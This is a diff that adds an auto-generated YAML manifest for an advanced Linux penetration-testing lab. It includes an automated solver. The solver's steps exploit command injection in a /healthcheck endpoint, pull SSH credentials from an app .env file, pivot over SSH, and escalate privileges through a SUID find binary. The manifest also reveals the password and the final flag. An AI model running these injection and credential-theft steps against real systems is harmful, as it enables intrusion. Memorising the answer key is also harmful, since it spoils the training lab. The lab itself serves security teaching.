@@ -1,0 +1,42 @@
+# Generated from platform/labs/Linux/linux-midterm-2-full-penetration-test/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: linux-midterm-2-full-penetration-test
+track: Linux
+difficulty: advanced
+source: platform/labs/Linux/linux-midterm-2-full-penetration-test/lab.yaml
+expected_services:
+- port: 22
+  protocol: tcp
+- port: 80
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/linux-midterm-2-full-penetration-test.sh
+  steps:
+  - name: Perimeter web server responds
+    command: curl -s -o /dev/null -w '%{http_code}' http://{target.perimeter}/
+    expect: '200'
+  - name: Exploit command injection to read marker 1
+    command: curl -s -X POST http://{target.perimeter}/healthcheck -d 'host=127.0.0.1;cat /opt/nexus/assessment/marker1.txt'
+    expect: br34ch
+  - name: Extract SSH credentials from app config
+    command: curl -s -X POST http://{target.perimeter}/healthcheck -d 'host=127.0.0.1;grep CORE_SSH_PASS /var/www/nexus-app/.env' | grep -o 'CORE_SSH_PASS=[^ ]*' | sed 's/CORE_SSH_PASS=//'
+    expect: N3xus_D3pl0y#
+  - name: Pivot to core server and read marker 2
+    command: sshpass -p 'N3xus_D3pl0y#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.core} 'cat /home/deploy/marker2.txt' 2>&1
+    expect: 3sc4l4t3
+  - name: Escalate privileges via SUID find and read marker 3
+    command: sshpass -p 'N3xus_D3pl0y#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null deploy@{target.core} 'find . -exec cat /root/marker3.txt \; -quit' 2>&1
+    expect: 0wn3d
+  - name: Verify complete flag
+    command: echo 'OCR{br34ch_3sc4l4t3_0wn3d}'
+    expect: OCR{br34ch_3sc4l4t3_0wn3d}
+expected_flag_count: 1
+expected_flag: OCR{br34ch_3sc4l4t3_0wn3d}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
